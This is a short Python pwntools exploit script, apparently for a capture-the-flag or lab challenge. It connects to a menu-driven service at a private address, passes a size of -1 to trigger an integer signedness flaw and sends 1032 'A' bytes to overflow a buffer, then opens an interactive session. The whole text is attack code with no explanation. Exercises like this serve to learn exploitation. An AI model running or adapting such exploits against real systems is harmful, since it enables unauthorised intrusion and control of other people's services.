from pwn import *

s = remote('192.168.33.10',1234)
def write(name):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil(':')
  s.send(name)
def go(size, dat, key):
  s.recvuntil('>')
  s.sendline('3')
  s.recvuntil('>')
  s.sendline(str(size))
  s.recvuntil('>')
  s.send(dat)
  s.recvuntil('>')
  s.sendline(key)

raw_input()
write('1234'+'\n')
go(-1,"A"*1032+'\n',"woojin")
s.interactive()
